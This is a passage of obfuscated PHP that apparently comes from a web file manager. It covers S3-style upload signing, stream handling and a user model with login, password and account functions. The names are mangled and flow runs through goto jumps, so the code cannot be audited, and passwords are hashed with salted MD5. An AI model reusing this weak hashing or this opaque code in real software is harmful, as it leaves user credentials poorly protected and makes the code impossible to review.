{ if (isset($a¤Ú·´ùÖ¼[$fñ¹–Ú¢Ï[1321]])) { $aÍ½¼Ä·”Ñ = $a¤Ú·´ùÖ¼[$fñ¹–Ú¢Ï[1321]]; } else { if (isset($aö‘Šó¹å”[$fñ¹–Ú¢Ï[1321]])) { $aÍ½¼Ä·”Ñ = $aö‘Šó¹å”[$fñ¹–Ú¢Ï[1321]]; } else { $aÍ½¼Ä·”Ñ = hash($fñ¹–Ú¢Ï[1234], $fñ¹–Ú¢Ï[33]); } } return array($fñ¹–Ú¢Ï[232] => $aö‘Šó¹å”[$fñ¹–Ú¢Ï[232]], $fñ¹–Ú¢Ï[1321] => $aÍ½¼Ä·”Ñ, $fñ¹–Ú¢Ï[222] => $aö‘Šó¹å”[$fñ¹–Ú¢Ï[1324]]); } return $aö‘Šó¹å”[$fñ¹–Ú¢Ï[232]]; goto bªâ„†‡Ã; b‹Ùáº‡¡Á: unset($c»ëô”à†[$fñ¹–Ú¢Ï[93]]); if (isset($c»ëô”à†[$fñ¹–Ú¢Ï[223]])) { return $this->listUploadParts($BßÒ¹„‰‘ë, $c»ëô”à†); } $a¤Ú·´ùÖ¼ = array(); goto d•â¦ÀÃÛ‘; b·¾ÓÕõŸ±: $F›ÎÎà¢„ = $fñ¹–Ú¢Ï[226]; $FÙ»‘©¼§â = $fñ¹–Ú¢Ï[8] . $this->pathEncode($BßÒ¹„‰‘ë) . $fù´ô¡‰îŠ; $aö‘Šó¹å” = $this->client->__getSignatureV4($a¤Ú·´ùÖ¼, $F¿·’ÆÓ—, $F›ÎÎà¢„, $FÙ»‘©¼§â); goto Bõ²½¯ëÉ¹; bªâ„†‡Ã: } public function listUploadParts($aŒ«ˆ‹Ûùø, $AŒÌ²¦ŸÏ¼ = array()) { goto E„Õ£¦È›; E„Õ£¦È›: $AÜ‚¸ËàÅä =& $_SERVER[œº]; $dĞ»Ñ¾ä×„ = str_replace($AÜ‚¸ËàÅä[233], $AÜ‚¸ËàÅä[33], $AŒÌ²¦ŸÏ¼[$AÜ‚¸ËàÅä[168]]); $C”–ÜöÄÇ± = $this->client->listParts($this->bucket, $aŒ«ˆ‹Ûùø, $dĞ»Ñ¾ä×„); goto dõ·Şƒ–’î; cÑ¤¿¥£›: $dİÅ¹ÒÓÙª .= $AÜ‚¸ËàÅä[1328]; $fñë—Ù¿•¥ = array(); $CÁÌ“¨­¾ = explode($AÜ‚¸ËàÅä[177], $this->getHost()); goto bÊïŞ´ßİ¡; dõ·Şƒ–’î: if (!$C”–ÜöÄÇ±) { return !1; } $dİÅ¹ÒÓÙª = $AÜ‚¸ËàÅä[1325]; foreach ($C”–ÜöÄÇ± as $BŠéùÙ¯è‚) { $dİÅ¹ÒÓÙª .= $AÜ‚¸ËàÅä[1326] . "\x3c\120\x61\x72\x74\x4e\165\x6d\142\145\x72\76{$BŠéùÙ¯è‚[$AÜ‚¸ËàÅä[1281]]}\74\57\120\141\x72\164\116\165\x6d\x62\145\162\x3e\12" . "\x3c\105\124\x61\147\76{$BŠéùÙ¯è‚[$AÜ‚¸ËàÅä[1282]]}\x3c\57\105\124\x61\x67\x3e\12" . $AÜ‚¸ËàÅä[1327]; } goto cÑ¤¿¥£›; eÛô”ëí¾: $B¶†ñ’­Œ = $this->client->__getSignatureV4($fñë—Ù¿•¥, $EçÉº“Ñ£¶, $BáÂâìâ›, $dïã ŠõÎµ, $dİÅ¹ÒÓÙª); return array($AÜ‚¸ËàÅä[232] => $B¶†ñ’­Œ[$AÜ‚¸ËàÅä[232]], $AÜ‚¸ËàÅä[222] => $B¶†ñ’­Œ[$AÜ‚¸ËàÅä[1324]], $AÜ‚¸ËàÅä[234] => $C”–ÜöÄÇ±, $AÜ‚¸ËàÅä[1321] => $B¶†ñ’­Œ[$AÜ‚¸ËàÅä[1321]]); goto E˜»ùŒêÅ…; bÊïŞ´ßİ¡: $EçÉº“Ñ£¶ = array($AÜ‚¸ËàÅä[1322] => $CÁÌ“¨­¾[1], $AÜ‚¸ËàÅä[211] => $AÜ‚¸ËàÅä[119], $AÜ‚¸ËàÅä[1236] => strlen($dİÅ¹ÒÓÙª)); $BáÂâìâ› = $AÜ‚¸ËàÅä[224]; $dïã ŠõÎµ = $AÜ‚¸ËàÅä[8] . $this->pathEncode($aŒ«ˆ‹Ûùø) . $AŒÌ²¦ŸÏ¼[$AÜ‚¸ËàÅä[168]]; goto eÛô”ëí¾; E˜»ùŒêÅ…: } public function link($A…øÁö–ÌÇ, $añ‹Õ¼ê§Ü = array()) { return parent::link($A…øÁö–ÌÇ, $añ‹Õ¼ê§Ü); } public function fileOut($A˜›Š„ò¿, $DøÜã¥±ó = false, $A¾ªñŞ“ã• = false, $AÂÇ°¶Û¦ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[œº][1329])) { return parent::fileOutServer($A˜›Š„ò¿, $DøÜã¥±ó, $A¾ªñŞ“ã•, $AÂÇ°¶Û¦); } parent::fileOut($A˜›Š„ò¿, $DøÜã¥±ó, $A¾ªñŞ“ã•, $AÂÇ°¶Û¦); } public function fileOutImage($f×ô£Ö³•š, $B¼Â¢ ³Æé = 250) { if (strstr($this->endpoint, $_SERVER[œº][1329])) { return parent::fileOutImageServer($f×ô£Ö³•š, $B¼Â¢ ³Æé); } parent::fileOutImage($f×ô£Ö³•š, $B¼Â¢ ³Æé); } public function fileOutLink($e‡öºë¶ôˆ) { $A‰±ö‘¥´­ =& $_SERVER[œº]; if (substr($e‡öºë¶ôˆ, 0, 7) == $A‰±ö‘¥´­[1204]) { $e‡öºë¶ôˆ = $A‰±ö‘¥´­[1205] . substr($e‡öºë¶ôˆ, 7); } header($A‰±ö‘¥´­[159] . $e‡öºë¶ôˆ); die; } public function getHost() { $D’“õÓãé =& $_SERVER[œº]; $a’ÎßÉ¨‚š = str_rtrim(parent::getHost(), $D’“õÓãé[8] . $this->bucket); $a’ÎßÉ¨‚š = explode($D’“õÓãé[177], $a’ÎßÉ¨‚š); return $a’ÎßÉ¨‚š[0] . $D’“õÓãé[177] . $this->bucket . $D’“õÓãé[95] . $a’ÎßÉ¨‚š[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($dŠì«õßÕâ, $cÖƒŒ²ÁóÄ = 0) { parent::__construct(); $this->source = $dŠì«õßÕâ; $this->sourceSize = $cÖƒŒ²ÁóÄ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($a±ô²¿ÉÉ¾ = false) { return $this->sourceSize; } public function getContent($dÈŠ¡®‹ = false) { return $this->fileSubstr($dÈŠ¡®‹, 0, $this->sourceSize); } public function fileSubstr($AÌ’Œ”–­Æ = false, $dÈ‚²îêÅ¹ = 0, $Føç—‚äµÍ = 0) { if (!$Føç—‚äµÍ) { $Føç—‚äµÍ = $this->sourceSize; } $f“˜Èæ÷…’ = $this->sourceSize - $dÈ‚²îêÅ¹; if ($Føç—‚äµÍ >= $f“˜Èæ÷…’) { $Føç—‚äµÍ = $f“˜Èæ÷…’; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $dÈ‚²îêÅ¹, $Føç—‚äµÍ); } if ($this->sourceType == self::TYPE_FILE) { if ($Føç—‚äµÍ <= 0) { return $_SERVER[œº][33]; } $d½ö¿î”¥ = ftell($this->source); fseek_64($this->source, $d½ö¿î”¥ + $dÈ‚²îêÅ¹); $fäÇ²²ÚĞå = @fread($this->source, $Føç—‚äµÍ); fseek_64($this->source, $d½ö¿î”¥); return $fäÇ²²ÚĞå; } } public function hashMd5($dùÁ„ÄİĞ‹ = false) { return md5($this->getContent()); } public static function hash($BƒÅ‘×à²ñ, $BÌØÍ–‚Œ‘ = 0) { $BÖ¯ÉšôèÖ = new PathDriverStream($BƒÅ‘×à²ñ, $BÌØÍ–‚Œ‘); return $BÖ¯ÉšôèÖ->hashSimple($BƒÅ‘×à²ñ); } public static function md5($A©ÚÙóÈª§, $BùñÅÍ³À— = 0) { $b½²ø¦—Îë = new PathDriverStream($A©ÚÙóÈª§, $BùñÅÍ³À—); return $b½²ø¦—Îë->hashMd5($A©ÚÙóÈª§); } } goto e˜Ãçª……õ; a“šˆğ¡É: class UserModel extends ModelBase { protected $tableName = "\x75\163\145\162"; protected $tableMeta = array("\x74\x61\142\154\x65\116\x61\155\145" => "\165\x73\145\x72\137\155\x65\x74\141", "\155\x65\x74\141\x46\151\145\x6c\x64" => "\165\x73\x65\x72\111\104"); protected $simpleField = "\x75\163\145\162\x49\x44\x2c\156\x69\x63\153\116\141\x6d\x65\x2c\x6e\x61\x6d\x65\54\141\166\x61\164\141\x72\x2c\x73\145\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($Dåö›Šñ) { $Dß¸æ°Ñ¦ =& $_SERVER[œº]; $a»¶ÉöáÍ = $Dß¸æ°Ñ¦[2116]; return array($Dß¸æ°Ñ¦[1762] => array($Dåö›Šñ[0], $a»¶ÉöáÍ), $Dß¸æ°Ñ¦[1764] => array($Dåö›Šñ[0], $a»¶ÉöáÍ), $Dß¸æ°Ñ¦[2117] => array($Dåö›Šñ[0], $a»¶ÉöáÍ)); } protected function getInfo($CÍĞ‰“’–ø, $C°¤óÌñÎ = false) { $C´¿¼¤‘É’ = $this->getInfoSimple($CÍĞ‰“’–ø); if (!is_array($C´¿¼¤‘É’)) { return array(); } if ($C°¤óÌñÎ) { return $this->_getInfoApply($C´¿¼¤‘É’); } return $this->cacheFunctionGet($_SERVER[œº][1771], $CÍĞ‰“’–ø); } protected function getInfoFull($Aõ¦¢ØÅŠ—, $c£Æğùé = false) { $d”ƒñ‹ ¨ = $this->getInfoSimple($Aõ¦¢ØÅŠ—); if (!is_array($d”ƒñ‹ ¨)) { return array(); } if ($c£Æğùé) { return $this->_getInfoApply($d”ƒñ‹ ¨, !0); return $this->_getInfoApply($d”ƒñ‹ ¨, !0); } return $this->cacheFunctionGet($_SERVER[œº][2118], $Aõ¦¢ØÅŠ—); } private function _getInfoApply($F¦ØØŒ—ƒ, $A–ŞÖ¨ŒÏ¤ = false) { goto cº¯§›„·Ò; C“©Àš‹¥: $F¦ØØŒ—ƒ[$fäŞ½·Š¯†[85]][$fäŞ½·Š¯†[1952]] = isset($c¢ç’á½Ä[$fäŞ½·Š¯†[1953]]) ? $c¢ç’á½Ä[$fäŞ½·Š¯†[1953]] : null; if ($A–ŞÖ¨ŒÏ¤) { $F¦ØØŒ—ƒ[$fäŞ½·Š¯†[445]] = $this->metaGet($F¦ØØŒ—ƒ[$fäŞ½·Š¯†[1528]]); } return $F¦ØØŒ—ƒ; goto b”öÀŠÁ·±; cº¯§›„·Ò: $fäŞ½·Š¯† =& $_SERVER[œº]; if (!$F¦ØØŒ—ƒ) { return $F¦ØØŒ—ƒ; } $D©ÆòãÆÉ­ = md5($fäŞ½·Š¯†[2119] . $F¦ØØŒ—ƒ[$fäŞ½·Š¯†[849]] . $fäŞ½·Š¯†[2120] . $F¦ØØŒ—ƒ[$fäŞ½·Š¯†[28]]); goto B“„Š†É°; B“„Š†É°: $F¦ØØŒ—ƒ = $this->_listDataApplyItem($F¦ØØŒ—ƒ); $c¢ç’á½Ä = Model($fäŞ½·Š¯†[1206])->metaGet($F¦ØØŒ—ƒ[$fäŞ½·Š¯†[85]][$fäŞ½·Š¯†[395]]); $F¦ØØŒ—ƒ[$fäŞ½·Š¯†[2121]] = $D©ÆòãÆÉ­; goto C“©Àš‹¥; b”öÀŠÁ·±: } protected function getInfoSimple($aÆÑ›´ˆô, $D¹òÌ‡„Ù’ = false) { $DÄÁˆ¾‘ =& $_SERVER[œº]; if (!$aÆÑ›´ˆô) { return array(); } if ($D¹òÌ‡„Ù’) { $eƒÍ‡Ä÷ƒÌ = $this->where(array($DÄÁˆ¾‘[1528] => intval($aÆÑ›´ˆô)))->find(); if (!is_array($eƒÍ‡Ä÷ƒÌ)) { return array(); } $eƒÍ‡Ä÷ƒÌ[$DÄÁˆ¾‘[2122]] = Action($DÄÁˆ¾‘[2123])->parseUrl($eƒÍ‡Ä÷ƒÌ[$DÄÁˆ¾‘[2122]]); return $eƒÍ‡Ä÷ƒÌ; } return $this->cacheFunctionGet($DÄÁˆ¾‘[1765], $aÆÑ›´ˆô); } protected function getInfoSimpleOuter($eÀùÙ…÷º) { goto f®‚ğ©·æø; bçŒªµ…ø¢: return $B³Á‚öÑƒ«; goto f²›¶Âá¾ˆ; f®‚ğ©·æø: $A ƒ·¶Ûàó =& $_SERVER[œº]; if (!$eÀùÙ…÷º || $eÀùÙ…÷º == 0) { return array($A ƒ·¶Ûàó[1528] => $A ƒ·¶Ûàó[191], $A ƒ·¶Ûàó[28] => $A ƒ·¶Ûàó[160] . LNG($A ƒ·¶Ûàó[2124]) . $A ƒ·¶Ûàó[504], $A ƒ·¶Ûàó[2122] => STATIC_PATH . $A ƒ·¶Ûàó[2125]); } $c¬×¢Ö‰˜Ş = $this->cacheFunctionGet($A ƒ·¶Ûàó[1765], $eÀùÙ…÷º); goto eİïìÍ´‰‹; eİïìÍ´‰‹: $B³Á‚öÑƒ« = array_field_key($c¬×¢Ö‰˜Ş, explode($A ƒ·¶Ûàó[47], $this->simpleField)); if (!$B³Á‚öÑƒ«) { return array($A ƒ·¶Ûàó[1528] => $A ƒ·¶Ûàó[1085], $A ƒ·¶Ûàó[28] => $A ƒ·¶Ûàó[160] . LNG($A ƒ·¶Ûàó[2126]) . $A ƒ·¶Ûàó[504], $A ƒ·¶Ûàó[2122] => STATIC_PATH . $A ƒ·¶Ûàó[2127]); } $B³Á‚öÑƒ«[$A ƒ·¶Ûàó[2122]] = Action($A ƒ·¶Ûàó[2123])->parseUrl($B³Á‚öÑƒ«[$A ƒ·¶Ûàó[2122]]); goto bçŒªµ…ø¢; f²›¶Âá¾ˆ: } protected function groupUser($EŠ‡æÇªœæ) { } public static function errorLang($aÉğ‘œùÇ’) { $eñ¹Ó÷ÎĞ =& $_SERVER[œº]; $CÇÈˆˆ¯Ş¢ = array(self::ERROR_USER_NOT_EXISTS => $eñ¹Ó÷ÎĞ[2128], self::ERROR_USER_PASSWORD_ERROR => $eñ¹Ó÷ÎĞ[2129], self::ERROR_USER_EXIST_NAME => $eñ¹Ó÷ÎĞ[2130], self::ERROR_USER_EXIST_PHONE => $eñ¹Ó÷ÎĞ[2131], self::ERROR_USER_EXIST_EMAIL => $eñ¹Ó÷ÎĞ[2132], self::ERROR_USER_LOGIN_LOCK => $eñ¹Ó÷ÎĞ[2133], self::ERROR_IP_NOT_ALLOW => $eñ¹Ó÷ÎĞ[2134], self::ERROR_USER_EXIST_NICKNAME => $eñ¹Ó÷ÎĞ[2135]); return LNG($CÇÈˆˆ¯Ş¢[$aÉğ‘œùÇ’]); } public function getInfoByMeta($DÁ…ó‚ö…ˆ, $FŠÎáÒ¯µ±) { $e¢òëù‡ÇÌ =& $_SERVER[œº]; $a“»¥Óæ’å = Model($e¢òëù‡ÇÌ[2136])->where(array($e¢òëù‡ÇÌ[93] => $DÁ…ó‚ö…ˆ, $e¢òëù‡ÇÌ[372] => $FŠÎáÒ¯µ±))->find(); if ($a“»¥Óæ’å) { return $this->getInfo($a“»¥Óæ’å[$e¢òëù‡ÇÌ[1528]]); } return !1; } public function userLoginCheck($aé‚¿‰æíò, $Bì¾ğÄ§¶ò) { $bß¸”ãíÛ =& $_SERVER[œº]; $FŸÉøç—ƒ¯ = $this->userLoginFind($aé‚¿‰æíò); if (!$FŸÉøç—ƒ¯) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($FŸÉøç—ƒ¯[$bß¸”ãíÛ[1528]], $Bì¾ğÄ§¶ò)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($FŸÉøç—ƒ¯[$bß¸”ãíÛ[1528]]); } public function userLoginFind($FÌ—Ï¢‚äà) { $bŒîÅÕÄ =& $_SERVER[œº]; $c—Ã‹áãÓ = array($bŒîÅÕÄ[28] => $FÌ—Ï¢‚äà, $bŒîÅÕÄ[1956] => $FÌ—Ï¢‚äà, $bŒîÅÕÄ[303] => $FÌ—Ï¢‚äà, $bŒîÅÕÄ[2137] => $FÌ—Ï¢‚äà, $bŒîÅÕÄ[957] => $bŒîÅÕÄ[959]); if ($this->nickNameRpt()) { unset($c—Ã‹áãÓ[$bŒîÅÕÄ[1956]]); } return $this->where($c—Ã‹áãÓ)->find(); } public function clearCache($Aˆ¸ÀÌ‰¸­) { $E‰Ä™ŞÉÛö =& $_SERVER[œº]; $this->cacheFunctionClear($E‰Ä™ŞÉÛö[1771], $Aˆ¸ÀÌ‰¸­); $this->cacheFunctionClear($E‰Ä™ŞÉÛö[1765], $Aˆ¸ÀÌ‰¸­); $this->cacheFunctionClear($E‰Ä™ŞÉÛö[2118], $Aˆ¸ÀÌ‰¸­); } public function userPasswordCheck($b²Š±ÔØ’ê, $eàğÕ°ä±‘) { $C£æä‡„ =& $_SERVER[œº]; $eƒÎâè›Á• = $this->where(array($C£æä‡„[1528] => intval($b²Š±ÔØ’ê)))->find(); $A“´”‹÷óÂ = $this->metaGet($b²Š±ÔØ’ê); $C«šĞÀ¬êÀ = isset($A“´”‹÷óÂ[$C£æä‡„[2138]]) ? $A“´”‹÷óÂ[$C£æä‡„[2138]] : $C£æä‡„[33]; if (md5($C«šĞÀ¬êÀ . trim($eàğÕ°ä±‘)) !== $eƒÎâè›Á•[$C£æä‡„[849]]) { return !1; } return !0; } public function userAdd($c›í§µ¾†) { goto dÅ¥åÑíÒ«; dÅ¥åÑíÒ«: $c½ØÆˆ›ñ =& $_SERVER[œº]; $F¸Õõ«Ó»Ô = array($c½ØÆˆ›ñ[413] => $c›í§µ¾†[$c½ØÆˆ›ñ[28]], $c½ØÆˆ›ñ[2139] => $c›í§µ¾†[$c½ØÆˆ›ñ[1411]], $c½ØÆˆ›ñ[2140] => isset($c›í§µ¾†[$c½ØÆˆ›ñ[303]]) ? $c›í§µ¾†[$c½ØÆˆ›ñ[303]] : $c½ØÆˆ›ñ[33], $c½ØÆˆ›ñ[2141] => isset($c›í§µ¾†[$c½ØÆˆ›ñ[2137]]) ? $c›í§µ¾†[$c½ØÆˆ›ñ[2137]] : $c½ØÆˆ›ñ[33], $c½ØÆˆ›ñ[2142] => isset($c›í§µ¾†[$c½ØÆˆ›ñ[1956]]) ? $c›í§µ¾†[$c½ØÆˆ›ñ[1956]] : $c›í§µ¾†[$c½ØÆˆ›ñ[28]], $c½ØÆˆ›ñ[2143] => isset($c›í§µ¾†[$c½ØÆˆ›ñ[2122]]) ? $c›í§µ¾†[$c½ØÆˆ›ñ[2122]] : $c½ØÆˆ›ñ[33], $c½ØÆˆ›ñ[2144] => isset($c›í§µ¾†[$c½ØÆˆ›ñ[2145]]) ? $c›í§µ¾†[$c½ØÆˆ›ñ[2145]] : 1, $c½ØÆˆ›ñ[2146] => $c›í§µ¾†[$c½ØÆˆ›ñ[849]], $c½ØÆˆ›ñ[1766] => isset($c›í§µ¾†[$c½ØÆˆ›ñ[1676]]) ? $c›í§µ¾†[$c½ØÆˆ›ñ[1676]] : 1024 * 1024 * 20, $c½ØÆˆ›ñ[1767] => 0, $c½ØÆˆ›ñ[2147] => 0, $c½ØÆˆ›ñ[1810] => isset($c›í§µ¾†[$c½ØÆˆ›ñ[710]]) ? $c›í§µ¾†[$c½ØÆˆ›ñ[710]] : 1); if (!empty($c›í§µ¾†[$c½ØÆˆ›ñ[1528]])) { $F¸Õõ«Ó»Ô[$c½ØÆˆ›ñ[1528]] = $c›í§µ¾†[$c½ØÆˆ›ñ[1528]]; } goto aèéŞÕÇ„•; aèéŞÕÇ„•: $bÙ¯¼íœôã = $this->_checkExist($c›í§µ¾†); if ($bÙ¯¼íœôã !== !0) { return $bÙ¯¼íœôã; } $b›º™÷½×ë = $this->add($F¸Õõ«Ó»Ô); goto fóËĞ›Œ; fóËĞ›Œ: $B³°‡‘ôß = array($c½ØÆˆ›ñ[2146] => $F¸Õõ«Ó»Ô[$c½ØÆˆ›ñ[849]], $c½ØÆˆ›ñ[2142] => $F¸Õõ«Ó»Ô[$c½ØÆˆ›ñ[1956]]); $this->userEdit($b›º™÷½×ë, $B³°‡‘ôß); Model($c½ØÆˆ›ñ[1206])->userRootAdd($b›º™÷½×ë); goto BßğÄÉôëã; BßğÄÉôëã: return $b›º™÷½×ë; goto B¹±âØÒ‡è; B¹±âØÒ‡è: } protected function userEditTest($eÖäÆ«‡ø, $d‰­‚´œ¦·) { return $this->call($_SERVER[œº][2148], $eÖäÆ«‡ø, $d‰­‚´œ¦·); } protected function userEdit($CÉ¡›ÉŠğØ, $DâÛöæĞ) { goto bâêÊ·ì‹Ğ; D•¦¶¡Šïó: $AÚåÉ–Éãé = $this->_checkExist($DâÛöæĞ, $CÉ¡›ÉŠğØ); if ($AÚåÉ–Éãé !== !0) { return $AÚåÉ–Éãé; } if (isset($DâÛöæĞ[$D«‹¦ïÂâê[849]]) && trim($DâÛöæĞ[$D«‹¦ïÂâê[849]]) != $D«‹¦ïÂâê[33]) { $fâ„™Ïì = $this->metaGet($CÉ¡›ÉŠğØ); if (empty($fâ„™Ïì[$D«‹¦ïÂâê[2138]])) { $fâ„™Ïì[$D«‹¦ïÂâê[2138]] = rand_string(10); Model($D«‹¦ïÂâê[502])->metaSet($CÉ¡›ÉŠğØ, $D«‹¦ïÂâê[2138], $fâ„™Ïì[$D«‹¦ïÂâê[2138]]); } $DâÛöæĞ[$D«‹¦ïÂâê[849]] = md5($fâ„™Ïì[$D«‹¦ïÂâê[2138]] . trim($DâÛöæĞ[$D«‹¦ïÂâê[849]])); } else { unset($DâÛöæĞ[$D«‹¦ïÂâê[849]]); } goto fÅ®Å¬›Â§; bâêÊ·ì‹Ğ: $D«‹¦ïÂâê =& $_SERVER[œº]; $DŸĞÉ¼ÚÖ“ = $this->getInfoSimple($CÉ¡›ÉŠğØ); if (!$DŸĞÉ¼ÚÖ“) { return !1; } goto D•¦¶¡Šïó; AÆ„¾ê·â: return !0; goto C±‡Ê•“õ; fÅ®Å¬›Â§: $this->where(array($D«‹¦ïÂâê[1520] => $CÉ¡›ÉŠğØ))->save($DâÛöæĞ); if (isset($DâÛöæĞ[$D«‹¦ïÂâê[1956]])) { $this->setNamePinyin($CÉ¡›ÉŠğØ, $DâÛöæĞ[$D«‹¦ïÂâê[1956]]); } $this->clearCache($CÉ¡›ÉŠğØ); goto AÆ„¾ê·â; C±‡Ê•“õ: } public function setNamePinyin($DÆƒŞ—ª•…, $D‚ ™ÕàŸà = false) { $Dæ‚²ø¦… =& $_SERVER[œº]; if (!$D‚ ™ÕàŸà) { $dÕ¯Éõø±¥ = $this->getInfoSimple($DÆƒŞ—ª•…); $D‚ ™ÕàŸà = $dÕ¯Éõø±¥[$Dæ‚²ø¦…[1956]] ? $dÕ¯Éõø±¥[$Dæ‚²ø¦…[1956]] : $dÕ¯Éõø±¥[$Dæ‚²ø¦…[28]]; } $CĞƒâëÏ®¥ = Model($Dæ‚²ø¦…[506]); if (!Input::check($D‚ ™ÕàŸà, $Dæ‚²ø¦…[556])) { return $CĞƒâëÏ®¥->metaSet($DÆƒŞ—ª•…, array($Dæ‚²ø¦…[444] => $Dæ‚²ø¦…[33], $Dæ‚²ø¦…[443] => $Dæ‚²ø¦…[33])); } return $CĞƒâëÏ®¥->metaSet($DÆƒŞ—ª•…, array($Dæ‚²ø¦…[444] => str_replace($Dæ‚²ø¦…[50], $Dæ‚²ø¦…[33], Pinyin::encode($D‚ ™ÕàŸà)), $Dæ‚²ø¦…[443] => Pinyin::encode($D‚ ™ÕàŸà, $Dæ‚²ø¦…[557]))); } private function nickNameRpt() { $eå¡„…µêÌ =& $_SERVER[œº]; $Aì¶÷Æ´† = Model($eå¡„…µêÌ[730])->get($eå¡„…µêÌ[2149]); $f´†Îå«‹™ = $GLOBALS[$eå¡„…µêÌ[6]][$eå¡„…µêÌ[378]][$eå¡„…µêÌ[2149]]; $aé½ğ°ƒ©‘ = !is_null($Aì¶÷Æ´†) ? $Aì¶÷Æ´† : $f´†Îå«‹™; return !!$aé½ğ°ƒ©‘; } private function _checkExist($Cì‘·¯•Öç, $b¢»À±„Õ„ = false) { $D¸ŠáÖ‹¹Œ =& $_SERVER[œº]; $Dš™¸ãšÍÖ = array($D¸ŠáÖ‹¹Œ[28] => UserModel::ERROR_USER_EXIST_NAME, $D¸ŠáÖ‹¹Œ[1956] => UserModel::ERROR_USER_EXIST_NICKNAME, $D¸ŠáÖ‹¹Œ[303] => UserModel::ERROR_USER_EXIST_EMAIL, $D¸ŠáÖ‹¹Œ[2137] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($Dš™¸ãšÍÖ[$D¸ŠáÖ‹¹Œ[1956]]); } $f¹ñÂ’“± = $b¢»À±„Õ„ ? array($D¸ŠáÖ‹¹Œ[1528] => array($D¸ŠáÖ‹¹Œ[2150], $b¢»À±„Õ„)) : array(); foreach ($Dš™¸ãšÍÖ as $f×ÍË„­ => $BàÔ©¬„Ş) { $f¯Àİæ‹ñ = array(); foreach ($Dš™¸ãšÍÖ as $A£Ş°Ó˜­Ñ => $A˜‡×Ò‰í™) { if (isset($Cì‘·¯•Öç[$A£Ş°Ó˜­Ñ]) && $Cì‘·¯•Öç[$A£Ş°Ó˜­Ñ]) { $f¯Àİæ‹ñ[] = $Cì‘·¯•Öç[$A£Ş°Ó˜­Ñ]; } } if (!$f¯Àİæ‹ñ) { continue; } $aµÚ›ìä = array_merge(array($f×ÍË„­ => array($D¸ŠáÖ‹¹Œ[7], $f¯Àİæ‹ñ)), $f¹ñÂ’“±); $aÆ–£°Åë = $this->where($aµÚ›ìä)->find(); if ($aÆ–£°Åë) { return $BàÔ©¬„Ş; } } return !0; } public function userListInfo($A†Õ¦ƒùŠ) { $AôÀµìƒÙõ =& $_SERVER[œº]; $aÖ³ƒî”½à = array(); $A†Õ¦ƒùŠ = is_array($A†Õ¦ƒùŠ) ? array_unique($A†Õ¦ƒùŠ) : array(); if (!$A†Õ¦ƒùŠ) { return $aÖ³ƒî”½à; } if (count($A†Õ¦ƒùŠ) < 20) { foreach ($A†Õ¦ƒùŠ as $B­§Äœ¤¯) { $aÖ³ƒî”½à[$B­§Äœ¤¯ . $AôÀµìƒÙõ[33]] = $this->getInfoSimpleOuter($B­§Äœ¤¯); } } else { $CµÍÜ¿îŠ = array($AôÀµìƒÙõ[1520] => array($AôÀµìƒÙõ[411], $A†Õ¦ƒùŠ)); if (count($A†Õ¦ƒùŠ) == 1) { $CµÍÜ¿îŠ = array($AôÀµìƒÙõ[1520] => $A†Õ¦ƒùŠ[0]); } $aÌìËóÈÍñ = Model($AôÀµìƒÙõ[502])->field($this->simpleField)->where($CµÍÜ¿îŠ)->select(); $aÌìËóÈÍñ = array_to_keyvalue($aÌìËóÈÍñ, $AôÀµìƒÙõ[1528]); foreach ($A†Õ¦ƒùŠ as $B­§Äœ¤¯) { $AŸÅ›ø­Ğ† = $aÌìËóÈÍñ[$B­§Äœ¤¯]; if (!$AŸÅ›ø­Ğ†) { $aÖ³ƒî”½à[$B­§Äœ¤¯ . $AôÀµìƒÙõ[33]] = $this->getInfoSimpleOuter($B­§Äœ¤¯); continue; } $AŸÅ›ø­Ğ†[$AôÀµìƒÙõ[2122]] = Action($AôÀµìƒÙõ[2123])->parseUrl($AŸÅ›ø­Ğ†[$AôÀµìƒÙõ[2122]]); $aÖ³ƒî”½à[$B­§Äœ¤¯ . $AôÀµìƒÙõ[33]] = $AŸÅ›ø­Ğ†; } } return $aÖ³ƒî”½à; } protected function userStatus($bõ²àèä¿˜, $AŠ³Ş˜Ø¢Ù) { $AäóÊÉä»õ = $this->getInfoSimple($bõ²àèä¿˜); if (!$AäóÊÉä»õ) { return !1; } $dìğŒ©Ğ÷“ = array($_SERVER[œº][710] => $AŠ³Ş˜Ø¢Ù); return $this->userEdit($bõ²àèä¿˜, $dìğŒ©Ğ÷“); } protected function userRemove($BÚíéËÄ) { goto AÎ‰¿ğˆøõ; f¦©Õƒë ®: Model($bß–Õ†ãØ‡[1973])->removeUserAll($BÚíéËÄ); Model($bß–Õ†ãØ‡[790])->userRootRemove($BÚíéËÄ); return $this->where($DãÌ›·ŞÊ¤)->delete(); goto b‘Ÿ§Ôƒƒ¥; AÎ‰¿ğˆøõ: $bß–Õ†ãØ‡ =& $_SERVER[œº]; $AŠÃÍˆø«° = $this->getInfoSimple($BÚíéËÄ); if (!$AŠÃÍˆø«°) { return !1; } goto C´ë¼äçÔ®; d…¡ßÊ‰åÑ: Model($bß–Õ†ãØ‡[1773])->where($DãÌ›·ŞÊ¤)->delete(); Model($bß–Õ†ãØ‡[2136])->where($DãÌ›·ŞÊ¤)->delete(); Model($bß–Õ†ãØ‡[2152])->where($DãÌ›·ŞÊ¤)->delete(); goto f¦©Õƒë ®; C´ë¼äçÔ®: $DãÌ›·ŞÊ¤ = array($bß–Õ†ãØ‡[1520] => $BÚíéËÄ); Model($bß–Õ†ãØ‡[563])->where($DãÌ›·ŞÊ¤)->delete(); Model($bß–Õ†ãØ‡[2151])->where($DãÌ›·ŞÊ¤)->delete(); goto d…¡ßÊ‰åÑ; b‘Ÿ§Ôƒƒ¥: } protected function userGroupSet($b½ñÓ‹¹©, $FëÓ¡çì‚Ë, 